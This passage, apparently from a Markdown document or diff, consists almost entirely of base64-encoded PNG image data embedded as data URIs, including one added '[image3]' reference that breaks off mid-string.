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>
 
+[image3]: <data:image/png;base64,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OpKghYiIiOjI3Jf/+05BRERExNU3J+8/LIiIiIi4+hK0EBERER1J0EJERER0JEELERER0ZEELURERERHErQQERERHUnQQkRERHQkQQsRERHRkQQtREREREcStBAREREdSdBCREREdCRBCxEREdGRBC1ERERERxK0EBERER1J0EJERER0JEELERER0ZEELURERERHErQQERERHUnQQkRERHQkQQsRERHRkQQtREREREcStBAREREdSdBCREREdCRBCxEREdGRBC1ERERERxK0EBERER1J0EJERER0JEELERER0ZEELURERERHErQQERERHUnQQkRERHQkQQsRERHRkQQtREREREcStBAREREdSdBCREREdCRBCxEREdGRBC1ERERERxK0EBERER1J0EJERER0JEELERER0ZEELURERERHErQQERERHUnQQkRERHQkQQsRERHRkQQtREREREcStBAREREdSdBCREREdCRBCxEREdGRBC1ERERERxK0EBERER1J0EJERER0JEELERER0ZEELcSPbVUab+6Wyf3bZGLfdpl6cafMvTEsjbPB+Pp9svDGbm9Yq27Pi4iIn2QJWoiXYHN6h1Q35SSXW4E3bpa5M8llISLiJ1eCFuKKrEr9QL/kYyHqKhnYs1Xm3rxXmmd17dUumd6/VUYGe6WHoHXF2JreKkV9nq7pT4zDj6v6f7P/Wsnt2CEL79rjED/ZErQQV2D9uT7pNcPTNddLbfq+xHS+VVl4caMUCFpXgPfJ3KPrgnNK0Fp1390jte05ghZmUoIW4goc+rRZk7VOxg53Clmh6i/55673a7YIWpetrTd3yNDaMDwTtFbbhRc3+LXABC3MoAQtxOX67nCsz1Xx0d3SXE7n9jO7ZfRGgtblauvkoIzo89OupSRoraaNQ0UZWBMcW4IWZlCCFuIy1X142oXxug0y/bPkNKnW75PZ+65eNGhNP7lBSjetjfp0XbNWCrf0yej+nYlpTVsnd8r4zmtlYMdGmX7zXqnXtsnIrmulmF8jPfleKe3cKOPPl6NAePZemXt+q+S9mrmr1Dqul+qD22XmzcVr5hqHt0ll+3op7dkhM09vlsqO9dJ3jb+t+RvXy9DdRZk8fK+/TafKMr1vo5S3XO3vz9qrpbijX+ZPJ5drq+ederxfBm5c226iLd+9WWq1sjQ6FdDq+NYPbpSh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I4fiH1rudD4Le0p+rYrdaT7NdUs3Jafq9eFLWV5gfjD+HctF9914fUaarZMq2MU6t6d4k/kusarUn1vkg98qCFUH7XO3VkaN49t6a1BGUq+VtVJ+2vpo+qndMr49XrNlm9+5LR6erO80xrRfWYLYZQlaiJesbtIqyfiea6Uv8Rd/r5R2b5baD1QhskihF1p7sF8Gblob1aqsXSuF2/plvJb+EkyvRuvJrTL+uOWTO2TW+yu/mhwX+vRgu0YrMS6w8a5fQ2AP99y/02/a0jVaB9OXMfF8UHh6NVrJ8draq3bzm99EODF8vRQ/F9Vw5Tf1yahaZ91uktS1Ogc6rP9F/1t2ukarlnaclLOJ7wrqfd4q5Zv8Qr6n0Ocd/3YTpgpDtbuvlerTO2VG1ybtim9n7jPrktu4ApvHd6rroE8GbozXFuW39CebIRfb9/DY2/NY848OrpfCunjNUmHHRpmopc+vr7mxwV5/29aslWJJTftiWV0rKcf5ye3J46vWWTRqpAqlzTLVKZTqZslDO2RMHe/idf4x7ll3tQzsLLa/3Rh3ketVXe/J5mTE7knQQkRERHQkQQsRERHRkQQtREREREcStBAREREdSdBCREREdCRBCxEREdGRBC1ERERERxK0EBERER1J0EJERER0JEELERER0ZEELURERERHErQQERERHUnQQkRERHQkQQsRERHRkQQtREREREcStBAREREdSdBCREREdCRBCxEREdGRBC1ERERERxK0EBERER1J0EJERER0JEELERER0ZEELURERERHErQQERERHUnQQkRERHQkQQsRERHRkQQtREREREcStBAREREdSdBCREREdCRBCxEREdGRBC1ERERERxK0EBERER1J0EJERER0JEELERER0ZEELURERERHErQQERERHUnQQkRERHQkQQsRERHRkQQtREREREcStBAREREdSdBCREREdCRBCxEREdGRBC1ERERERxK0EBERER1J0EJERER0JEELERER0ZEELURERERHErQQERERHUnQQkRERHQkQQsRERHRkQQtREREREfmBAAAAACcQNACAAAAcARBCwAAAMARBC0AAAAARxC0AAAAABxB0AIAAABwBEELAAAAwBEELQAAAABHELQAAAAAHEHQAgAAAHAEQQsAAADAEQQtAAAAAEcQtAAAAAAcQdACAAAAcARBCwAAAMARBC0AAAAARxC0AAAAABxB0AIAAABwBEELAAAAwBEELQAAAABHELQAAAAAHEHQAgAAAHAEQQsAAADAEQQtAAAAAEcQtAAAAAAcQdACAAAAcARBCwAAAMARBC0AAAAARxC0AAAAABxB0AIAAABwBEELAAAAwBEELQAAAABHELQAAAAAHEHQAgAAAHAEQQsAAADAEQQtAAAAAEcQtAAAAAAcQdACAAAAcARBCwAAAMARBC0AAAAARxC0AAAAABxB0AIAAABwBEELAAAAwBEELQAAAABHELQAAAAAHEHQAgAAAHAEQQsAAADAEQQtA